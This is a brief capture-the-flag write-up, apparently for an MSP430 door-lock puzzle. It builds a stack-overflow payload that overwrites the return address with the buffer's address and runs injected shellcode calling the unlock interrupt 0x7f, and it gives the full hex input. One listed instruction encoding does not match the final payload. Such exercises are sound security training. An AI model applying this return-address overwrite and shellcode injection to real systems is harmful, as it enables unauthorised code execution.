Another stack overflow changing the return address to where my buffer is on the stack.  

Same buffer length of 16 bytes before the return overwrite and my buffer starts at 0x3c9e.

Write a call to run the 0x7f interrupt which will unlock the door. 

3012 7f00    push #0x7f
b012 3245    call #0x4532         (grabbed this from the call inside of the code)
3012 7f00    push #0x7f
b012 7f00    call #0x4532         (repeated just to fill the 16 bytes)
9e3c                              (return to buffer, don't forget endianness)

so the pw input:
30127f00b012324530127f00b01232459e3c
